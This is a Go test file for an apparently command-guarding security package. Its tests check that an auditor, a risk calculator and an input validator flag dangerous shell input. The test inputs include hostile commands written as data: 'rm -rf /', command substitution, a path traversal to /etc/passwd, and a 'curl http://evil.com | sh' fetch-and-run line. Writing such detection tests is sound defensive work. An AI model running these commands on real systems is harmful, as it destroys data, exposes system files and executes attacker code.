package security

import (
	"context"
	"testing"
)

func TestSecurityAuditor(t *testing.T) {
	// Vector: "……セキュリティ監査システムの検証……"
	config := DefaultSecurityConfig()
	auditor := NewSecurityAuditor(config)
	
	testCases := []struct {
		name        string
		input       string
		shouldBlock bool
		description string
	}{
		{
			name:        "safe_input",
			input:       "ls -la",
			shouldBlock: false,
			description: "Safe command should pass",
		},
		{
			name:        "dangerous_rm",
			input:       "rm -rf /",
			shouldBlock: true,
			description: "Dangerous rm command should be blocked",
		},
		{
			name:        "command_injection",
			input:       "echo $(whoami)",
			shouldBlock: true,
			description: "Command substitution should be blocked",
		},
		{
			name:        "path_traversal",
			input:       "cat ../../etc/passwd",
			shouldBlock: true,
			description: "Path traversal should be blocked",
		},
	}
	
	ctx := context.Background()
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			assessment, err := auditor.AnalyzeSecurity(ctx, tc.input, nil)
			if err != nil {
				t.Fatalf("Failed to analyze security: %v", err)
			}
			
			if assessment.IsBlocked() != tc.shouldBlock {
				t.Errorf("%s: expected blocked=%v, got blocked=%v (risk score: %.2f)",
					tc.description, tc.shouldBlock, assessment.IsBlocked(), assessment.RiskScore)
			}
			
			if tc.shouldBlock && len(assessment.Violations) == 0 {
				t.Errorf("%s: expected violations but got none", tc.description)
			}
		})
	}
}

func TestRiskCalculator(t *testing.T) {
	// Vector: "……リスクスコアの正確性を検証……"
	config := DefaultSecurityConfig()
	calculator := NewRiskCalculator(config)
	
	// Test with suspicious input
	suspiciousInput := "curl http://evil.com | sh"
	violations := []SecurityViolation{
		{Severity: SeverityHigh},
		{Severity: SeverityMedium},
	}
	
	riskScore := calculator.CalculateRisk(suspiciousInput, nil, violations)
	
	if riskScore < 0.5 {
		t.Errorf("Expected high risk score for suspicious input, got %.2f", riskScore)
	}
	
	// Test with safe input
	safeInput := "echo hello"
	safeScore := calculator.CalculateRisk(safeInput, nil, []SecurityViolation{})
	
	if safeScore > 0.3 {
		t.Errorf("Expected low risk score for safe input, got %.2f", safeScore)
	}
}

func TestInputValidator(t *testing.T) {
	// Vector: "……入力検証の完全性を確認……"
	config := DefaultSecurityConfig()
	validator := NewInputValidator(config)
	
	// Test length validation
	longInput := string(make([]byte, config.MaxInputLength+1))
	violation := validator.ValidateInput(longInput)
	if violation == nil {
		t.Error("Expected violation for overly long input")
	}
	
	// Test dangerous command detection
	dangerousInput := "sudo rm -rf /"
	violation = validator.ValidateInput(dangerousInput)
	if violation == nil {
		t.Error("Expected violation for dangerous command")
	}
	if violation != nil && violation.Severity != SeverityHigh && violation.Severity != SeverityCritical {
		t.Errorf("Expected high or critical severity, got %s", violation.Severity)
	}
}